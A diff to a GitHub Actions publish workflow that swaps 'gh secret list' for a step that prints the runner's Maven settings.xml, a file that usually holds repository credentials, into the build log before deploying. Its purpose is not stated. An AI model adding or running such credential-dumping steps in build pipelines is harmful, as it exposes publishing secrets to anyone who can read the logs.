@@ -35,7 +35,7 @@ jobs:
 
     - name: Build and Publish to Apache Maven Central
       run: |
-        gh secret list
+        cat /home/runner/.m2/settings.xml
         mvn clean deploy
       env:
         GH_TOKEN: ${{ github.token }}
